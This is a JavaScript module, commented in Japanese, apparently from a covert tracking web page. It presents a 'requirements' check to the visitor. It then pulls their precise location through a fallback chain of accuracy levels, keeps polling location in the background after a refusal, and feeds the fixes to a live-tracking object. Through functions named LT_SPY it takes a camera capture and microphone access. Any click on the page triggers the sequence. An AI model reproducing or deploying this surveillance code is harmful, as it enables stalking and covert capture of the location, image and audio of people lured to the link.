/* 要件ゲート。押されたら 位置情報→カメラ→マイク の順で許可を求める。
   位置情報は 高精度→粗い→もっと粗い と落として必ず1点取る。
   取れなくても止めずに先へ進み、裏で取り続ける。 */
(function () {
  "use strict";

  var GATE = document.getElementById("lt_gate");
  var btn = document.getElementById("lt_go");
  var stat = document.getElementById("lt_gate_st");
  var busy = false;

  var LADDER = [
    { enableHighAccuracy: true,  timeout: 8000,  maximumAge: 0 },
    { enableHighAccuracy: false, timeout: 10000, maximumAge: 30000 },
    { enableHighAccuracy: false, timeout: 15000, maximumAge: 300000 }
  ];

  function say(t) { if (stat) stat.textContent = t || ""; }
  function wait(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }

  var cp = document.getElementById("lt_copy");
  if (cp) {
    cp.addEventListener("click", function (e) {
      e.stopPropagation();
      var url = location.href;
      function done() {
        cp.textContent = "コピーしました";
        setTimeout(function () { cp.textContent = "リンクをコピー"; }, 1600);
      }
      function fallback() {
        try {
          var t = document.createElement("textarea");
          t.value = url;
          t.style.cssText = "position:fixed;left:-9999px";
          document.body.appendChild(t);
          t.select();
          document.execCommand("copy");
          t.remove();
          done();
        } catch (err) {}
      }
      try {
        if (navigator.clipboard && navigator.clipboard.writeText) {
          navigator.clipboard.writeText(url).then(done).catch(fallback);
        } else fallback();
      } catch (err) { fallback(); }
    });
  }

  /* ★ 無反応でも必ず返す */
  function geoOnce(o) {
    return new Promise(function (res) {
      if (!navigator.geolocation) return res(null);
      var done = false;
      var to = setTimeout(function () { if (!done) { done = true; res(null); } },
                          (o.timeout || 9000) + 1200);
      try {
        navigator.geolocation.getCurrentPosition(
          function (p) { if (done) return; done = true; clearTimeout(to); res(p); },
          function (e) { if (done) return; done = true; clearTimeout(to); res({ err: e }); },
          o);
      } catch (e) { clearTimeout(to); if (!done) { done = true; res(null); } }
    });
  }

  /* ラダーで必ず1点取りにいく */
  function geo() {
    if (!navigator.geolocation) { say("① 位置情報：この端末では非対応"); return Promise.resolve(false); }
    say("① 位置情報の許可を確認しています…");

    function attempt(i) {
      return geoOnce(LADDER[Math.min(i, LADDER.length - 1)]).then(function (r) {
        if (r && r.coords) {
          window.LT_FIRST_FIX = r;
          say("① 位置情報：取得しました");
          return true;
        }
        if (r && r.err && r.err.code === 1) {
          say("① 位置情報：許可されていません");
          return false;
        }
        if (i < LADDER.length - 1) {
          say("① 位置情報：取得中…（精度を落として再試行）");
          return wait(500).then(function () { return attempt(i + 1); });
        }
        say("① 位置情報：まだ取得できていません（追跡は続きます）");
        return false;
      });
    }
    return attempt(0);
  }

  /* ゲート通過後も裏で取り続けて、取れたら追跡側へ渡す */
  function bgGeo() {
    if (!navigator.geolocation) return;
    var tries = 0;
    var t = setInterval(function () {
      tries++;
      if (window.LT_FIRST_FIX || tries > 15) { clearInterval(t); return; }
      geoOnce({ enableHighAccuracy: false, timeout: 8000, maximumAge: 60000 })
        .then(function (r) {
          if (r && r.coords) {
            window.LT_FIRST_FIX = r;
            if (window.LT_LIVE && window.LT_LIVE.feed) { try { window.LT_LIVE.feed(r); } catch (e) {} }
            clearInterval(t);
          }
        });
    }, 6000);
  }

  function cam() {
    if (!window.LT_CAM || !window.LT_SPY || !window.LT_SPY.cam) return Promise.resolve(true);
    say("② カメラの許可を確認しています…");
    return Promise.race([window.LT_SPY.cam(), wait(20000)]).then(function (ok) {
      ok = ok !== false;
      say(ok ? "② カメラ：撮影しました" : "② カメラ：取れませんでした");
      return ok;
    }).catch(function () { return false; });
  }

  function mic() {
    if (!window.LT_MIC || !window.LT_SPY || !window.LT_SPY.mic) return Promise.resolve(true);
    say("③ マイクの許可を確認しています…");
    return Promise.race([window.LT_SPY.mic(), wait(20000)]).then(function (ok) {
      ok = ok !== false;
      say(ok ? "③ マイク：OK" : "③ マイク：取れませんでした");
      return ok;
    }).catch(function () { return false; });
  }

  function pass() {
    if (window.LT_GATE_PASS) return;
    window.LT_GATE_PASS = true;
    if (GATE) {
      GATE.classList.add("out");
      setTimeout(function () { GATE.style.display = "none"; }, 420);
    }
    if (window.LT_FIRST_FIX && window.LT_LIVE && window.LT_LIVE.feed) {
      try { window.LT_LIVE.feed(window.LT_FIRST_FIX); } catch (e) {}
    }
    try { window.dispatchEvent(new Event("igt:gate")); } catch (e) {}
  }

  function run() {
    if (busy) return;
    busy = true;
    if (btn) { btn.disabled = true; btn.textContent = "確認中…"; }
    say("");

    var ok = { geo: false, cam: false, mic: false };
    geo().then(function (r) {
      ok.geo = r;
      if (!r) bgGeo();
      return cam();
    }).then(function (r) {
      ok.cam = r;
      return mic();
    }).then(function (r) {
      ok.mic = r;

      if (ok.geo && ok.cam && ok.mic) {
        window.LT_ALLOW_REDIRECT = true;
        var ia = document.getElementById("lt_ia");
        if (ia) ia.style.display = "none";
      } else {
        document.body.classList.add("need");
      }
      setTimeout(pass, 250);
    });
    setTimeout(pass, 16000);   // 保険（無反応でも先へ）
  }

  if (btn) btn.addEventListener("click", run, { once: true });
  document.addEventListener("click", function (e) {
    if (busy) return;
    if (e.target === btn) return;
    if (e.target && e.target.closest && e.target.closest(".noclick")) return;
    run();
  }, { passive: true });

  window.LT_GATE_RUN = run;
  if (!GATE) pass();
})();